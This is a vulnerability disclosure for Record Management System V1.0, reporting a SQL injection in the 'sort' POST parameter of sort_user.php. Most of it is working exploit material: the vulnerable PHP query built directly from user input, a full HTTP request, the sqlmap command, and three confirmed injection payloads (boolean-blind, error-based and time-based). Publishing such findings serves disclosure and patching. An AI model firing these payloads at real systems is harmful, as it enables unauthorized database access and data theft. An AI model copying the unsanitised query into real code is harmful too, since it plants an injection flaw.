### VUL_AUTHOR:netmanzhang
# Record Management System - SQL Injection on (sort_user.php sort parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 
## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
sort_user.php 

On this page, sort parameter is vulnerable to SQL Injection Attack 
## Source code(Personnel_record_management_system/sort_user.php):
```
$sort=$_POST['sort'];
$name_query=mysqli_query($conn,"select * from school where Name='$sort'")or die(mysqli_error());
$query_row=mysqli_fetch_array($name_query);
```
## Proof of vulnerability(Verify using the sqlmap tool):
### Request:
```
POST /Personnel_record_management_system/sort_user.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 135
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=52388hjgjeif4bl4r5sqp2bmpm
Origin: http://localhost
Referer: http://localhost/Personnel_record_management_system/emp_profiles_user.php
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

filter=&sort=Sort+Personnel+by+School
```
#### -> sqlmap -r 1.txt(above request package) --batch
## Output:
```
---
Parameter: sort (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: filter=&sort=Sort Personnel by Schoo' OR NOT 7523=7523#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: filter=&sort=Sort Personnel by Schoo' OR (SELECT 8098 FROM(SELECT COUNT(*),CONCAT(0x71766a7171,(SELECT (ELT(8098=8098,1))),0x7178627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zzAA

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: filter=&sort=Sort Personnel by Schoo' AND (SELECT 4170 FROM (SELECT(SLEEP(5)))VaGH)-- Lvda
---
```
